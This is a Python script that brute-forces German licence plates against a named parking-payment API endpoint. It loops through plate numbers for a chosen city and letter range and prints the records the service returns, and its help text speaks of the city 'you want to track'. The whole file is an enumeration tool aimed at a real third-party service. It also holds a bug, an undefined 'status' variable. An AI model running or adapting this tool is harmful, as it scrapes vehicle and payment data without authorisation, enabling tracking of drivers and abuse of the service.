import requests
import argparse
import aiohttp
import asyncio
import sys

parken_url = "https://8s5zm653e0.execute-api.eu-central-1.amazonaws.com/production/v2/payment/plate/search?plate="

def args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--city",
                        "-c",
                        dest="city",
                        required=True,
                        help="the city you want to track ... M for munich, B for berlin ...")
    parser.add_argument("--letters",
                        "-l",
                        dest="letters",
                        required=True,
                        help="The letter range to bruteforce [A-Z]{1,2}")
    parser.add_argument("--rangestart",
                        "-s",
                        required=False,
                        dest="start",
                        default=1,
                        type=int,
                        help="The start of the range to bruteforce")
    parser.add_argument("--rangeend",
                        "-e",
                        required=False,
                        dest="end",
                        default=9999,
                        type=int,
                        help="The end of the range to bruteforce")
    parser.add_argument("--onlyhits",
                        "-o",
                        nargs='?',
                        type=bool,
                        default=False,
                        const=True,
                        dest="onlyhits",
                        help="Only show positive hits, disregard all of the unwanted stuff")

    return parser.parse_args()


async def brute_plate(city, letters, start: int = 1, end: int = 9999, onlyhits: bool = False):
    async with aiohttp.ClientSession() as session:
        try:
            counter = start
            while counter <= end:
                plate = f"{city}-{letters}{counter}"
                async with session.get(url=f"{parken_url}{plate}") as t_req:
                    text = await t_req.text()
                    if onlyhits and len(text) > 2:
                        print(f"Plate: {plate} - state: {t_req.status} - Return: {text}")
                    if not onlyhits:
                        print(f"Plate: {plate} - state: {t_req.status} - Return: {text}")
                counter += 1
        except Exception as e:
            print(f"ERROR EXCEPTION (plate: {plate}): {e}")
            sys.exit(1)
        if not status == 200:
            print(f"ERROR - state (plate: {plate}): {status}")
            sys.exit(1)
def main():

    myargs = args()
    asyncio.run(brute_plate(myargs.city, myargs.letters, myargs.start, myargs.end, myargs.onlyhits))



if __name__ == '__main__':
    main()